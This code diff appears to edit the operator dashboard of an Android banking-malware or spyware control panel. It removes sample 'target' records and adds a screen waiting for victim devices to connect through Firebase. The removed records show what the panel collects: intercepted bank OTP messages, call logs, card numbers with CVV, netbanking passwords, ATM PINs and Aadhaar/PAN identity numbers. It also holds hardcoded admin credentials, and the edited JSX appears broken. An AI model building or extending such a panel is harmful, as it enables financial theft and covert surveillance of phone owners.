@@ -6,70 +6,7 @@ include_once __DIR__ . '/header.php';
   <div id="root"></div>
 
   <script type="text/babel">
-    const MOCK_DATA = [
-      {
-        id: "target_001",
-        userId: "USR-9821",
-        fullName: "Vikram Sharma",
-        mobileNumber: "+91 98765 43210",
-        numberField: "A/C: 9871029381",
-        stringField: "Samsung Galaxy S23 Ultra (Android 14)",
-        simState: "Dual-SIM Active (Jio 5G + Airtel 4G)",
-        batteryLevel: "88%",
-        isActive: true,
-        isConnected: true,
-        appInBackground: true,
-        lastActivityTime: "Just now",
-        totalSmsCount: 14,
-        totalCallsCount: 6,
-        sim1Data: { slot: 1, carrier: "Jio 5G", phone: "+91 98765 43210", network: "5G SA", serial: "899100293810293819F", countryCode: "IN" },
-        sim2Data: { slot: 2, carrier: "Airtel 4G", phone: "+91 98765 88990", network: "4G LTE", serial: "899100293810293810A", countryCode: "IN" },
-        smsDataList: [
-          { sender: "BANK-OTP", message: "Your OTP for transaction Rs 4,999 is 882190. Do not share.", timestamp: "10:42 AM", type: "INBOX" },
-          { sender: "HDFC-ALERT", message: "A/c xx9102 debited for INR 1,200.00 at Swiggy.", timestamp: "09:15 AM", type: "INBOX" },
-          { sender: "+91 98765 43210", message: "Sending confirmation details.", timestamp: "Yesterday", type: "SENT" }
-        ],
-        callDataList: [
-          { number: "+91 98765 43210", type: "INCOMING", duration: "2m 15s", timestamp: "10:30 AM" },
-          { number: "+91 91234 56789", type: "OUTGOING", duration: "45s", timestamp: "08:20 AM" }
-        ],
-        cardDataList: [
-          { bankName: "State Bank of India", cardType: "Credit Card", cardNumber: "4532 8810 9012 8821", cardHolder: "VIKRAM SHARMA", expiry: "08/28", cvv: "492" }
-        ],
-        formDataList: [
-          { id: "frm_101", formTitle: "NetBanking Login Form", fields: { "User ID": "vikram_sbi98", "Password": "Pass@9810#", "Profile Password": "ProfPass@88#", "ATM PIN": "4891" }, timestamp: "10:45 AM" },
-          { id: "frm_102", formTitle: "KYC Aadhaar & PAN Form", fields: { "Aadhaar No": "5489 1029 3841", "PAN Card": "ABCPS9810F", "DOB": "14/08/1994" }, timestamp: "Yesterday" }
-        ]
-      },
-      {
-        id: "target_002",
-        userId: "USR-7734",
-        fullName: "Ananya Roy",
-        mobileNumber: "+91 91234 56789",
-        numberField: "A/C: 4410928371",
-        stringField: "OnePlus 11 5G (Android 13)",
-        simState: "SIM 1 Active (Airtel 5G)",
-        batteryLevel: "42%",
-        isActive: true,
-        isConnected: true,
-        appInBackground: false,
-        lastActivityTime: "2m ago",
-        totalSmsCount: 9,
-        totalCallsCount: 3,
-        sim1Data: { slot: 1, carrier: "Airtel 5G", phone: "+91 91234 56789", network: "5G NSA", serial: "899144029102938411B", countryCode: "IN" },
-        sim2Data: { slot: 2, carrier: "Jio 4G", phone: "+91 91234 11223", network: "4G LTE", serial: "899144029102938419C", countryCode: "IN" },
-        smsDataList: [
-          { sender: "SBI-MSG", message: "Your credit card bill of Rs 12,450 is due on 05-Aug.", timestamp: "Yesterday", type: "INBOX" }
-        ],
-        callDataList: [],
-        cardDataList: [
-          { bankName: "HDFC Bank", cardType: "Debit Card", cardNumber: "5241 8109 4410 9912", cardHolder: "ANANYA ROY", expiry: "11/27", cvv: "078" }
-        ],
-        formDataList: [
-          { id: "frm_201", formTitle: "Card Activation Form", fields: { "Customer ID": "hdfc_ananya", "Password": "AnanyaPass#12", "ATM PIN": "1209" }, timestamp: "2m ago" }
-        ]
-      }
-    ];
+    const MOCK_DATA = [];
 
     let INITIAL_OPERATORS = [
       { id: "admin_1", username: "admin", email: "admin@adminto.com", password: "admin123", fullName: "Super Administrator", role: "superadmin", expiryDate: "2099-12-31", firebaseConfig: { projectId: "adminto-superadmin", orgId: "org_all" } },
@@ -758,7 +695,19 @@ include_once __DIR__ . '/header.php';
                     </button>
                   </div>
                 </div>
-              ))}
+              {filtered.length === 0 && (
+                <div className="glass-panel" style={{ padding: '3.5rem 2rem', textAlign: 'center', margin: '1.5rem 0', border: '1px dashed rgba(99,102,241,0.35)', background: 'rgba(99,102,241,0.04)', borderRadius: '16px' }}>
+                  <div style={{ fontSize: '3rem', marginBottom: '1rem' }}>📡</div>
+                  <h3 style={{ color: '#fff', fontSize: '1.3rem', marginBottom: '0.5rem', fontWeight: 600 }}>No Target Devices Connected Yet</h3>
+                  <p style={{ color: '#9ca3af', fontSize: '0.9rem', maxWidth: '520px', margin: '0 auto 1.5rem auto', lineHeight: '1.5' }}>
+                    Realtime Firebase listener is active. As soon as a target device connects to your Firebase RTDB or MySQL project, it will automatically appear here live.
+                  </p>
+                  <div style={{ display: 'inline-flex', alignItems: 'center', gap: '8px', padding: '8px 16px', borderRadius: '24px', background: 'rgba(52,211,153,0.12)', color: '#34d399', fontSize: '0.82rem', fontWeight: 700, border: '1px solid rgba(52,211,153,0.25)' }}>
+                    <span className="pulse-dot"></span>
+                    <span>Realtime Listener Active & Listening for Connected Devices...</span>
+                  </div>
+                </div>
+              )}
             </div>
           </main>
 
